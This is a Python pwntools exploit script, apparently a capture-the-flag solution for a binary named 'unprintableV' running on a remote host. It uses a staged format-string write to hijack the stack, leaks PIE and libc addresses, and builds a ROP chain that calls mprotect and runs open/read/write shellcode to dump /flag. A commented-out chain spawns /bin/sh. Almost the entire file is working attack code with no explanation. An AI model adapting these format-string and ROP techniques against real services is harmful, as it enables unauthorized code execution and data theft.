from pwn import *

def pivot(r, g):
  pay = '%'+str(r)+'c'+'%6$hhn'
  sleep(0.7)
  p.send(pay+'\x00'*0x30)
  pay = '%'+str(g)+'c'+'%10$hhn'
  sleep(0.7)
  p.send(pay+'\x00'*0x30)

context.log_level = 'debug'

#p = process('./unprintableV')
p = remote('212.64.44.87', 14518)
e = ELF('./unprintableV')
l = e.libc

p.recvuntil('0x')
stack = int(p.recvline().strip(), 16)
print hex(stack)

lsb = stack & 0xff

# double-staged fsb

pay = '%'+str(lsb)+'c'
pay += '%6$hhn'
p.send(pay+'\x00'*0x30)
sleep(0.7)

pay = '%'+str(0x20)+'c'
pay += '%10$hhn'
p.send(pay+'\x00'*0x30)
sleep(0.7)

pay = '%'+str(0x0680)+'c'
pay += '%9$hn'
p.send(pay+'\x00'*0x30)
sleep(0.7)

# leak

p.send('%1$p %3$p'+'\x00'*0x30)
p.recvuntil('0x')
pie = int(p.recv(12), 16) # buf
print hex(pie)

p.recvuntil('0x')
libc = int(p.recv(12), 16) - 0x110081
print hex(libc)

prax = libc + 0x439c8
prdi = libc + 0x2155f
prsi = libc + 0x23e6a
prdx = libc + 0x1b96
pr8 = libc + 0x155fc6
pr10 = libc + 0x1306b5
prbp = libc + 0x21353
leaveret = libc + 0x54803
syscall = libc + 0x13c0
gets = libc + l.sym['gets']

# get sell

target = lsb+0x10
rop = [prbp, pie+0x20, leaveret]
idx = 0

for gg in rop:
  rip = target + idx*0x8
  rip = rip&0xff
  print hex(rip)+' : '+hex(gg)

  pivot(rip, gg&0xff)
  pivot(rip+1, (gg&0xff00)>>8)
  pivot(rip+2, (gg&0xff0000)>>16)
  pivot(rip+3, (gg&0xff000000)>>24)
  pivot(rip+4, (gg&0xff00000000)>>32)
  pivot(rip+5, (gg&0xff0000000000)>>40)

  idx += 1

# find flag (echo * >&2)

"""
shell = 'd^3CTF'.ljust(0x28, '\x00')
shell += p64(prdi)+p64(0xffffffffffff)
shell += p64(prsi)+p64(pie+0x100)
shell += p64(prdx)+p64(0)
shell += p64(pr10)+p64(0)
shell += p64(pr8)+p64(0)
shell += p64(prax)+p64(322)
shell += p64(syscall)
shell = shell.ljust(0x100, '\x00')
shell += '/bin/sh\x00'
"""

# orw /flag

context.arch = 'amd64'

orw = 'd^3CTF'.ljust(0x28, '\x00')
orw += p64(prdi)+p64(pie&~0xfff)
orw += p64(prsi)+p64(0x1000)
orw += p64(prdx)+p64(7)
orw += p64(libc+l.sym['mprotect'])
orw += p64(pie+0x80)
orw = orw.ljust(0x80, '\x00')

sc = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x50)
sc += shellcraft.write(2, 'rsp', 0x50)
orw += asm(sc)

sleep(0.7)
p.send(orw)

p.interactive()
